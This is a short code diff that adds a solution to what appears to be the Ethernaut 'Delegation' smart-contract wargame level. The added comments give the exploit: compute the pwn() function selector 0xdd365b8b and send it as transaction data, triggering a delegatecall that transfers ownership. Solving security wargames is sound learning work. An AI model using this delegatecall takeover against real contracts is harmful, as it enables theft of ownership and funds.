@@ -40,6 +40,11 @@ contract Delegation {
     }
 }
 
+// Hack :
+// web3.eth.abi.encodeFunctionSignature(pwn());
+// 0xdd365b8b
+// contract.sendTransaction({data: "0xdd365b8b"})
+
 /**
  * The goal of this level is for you to claim ownership of the instance you are given.
  *
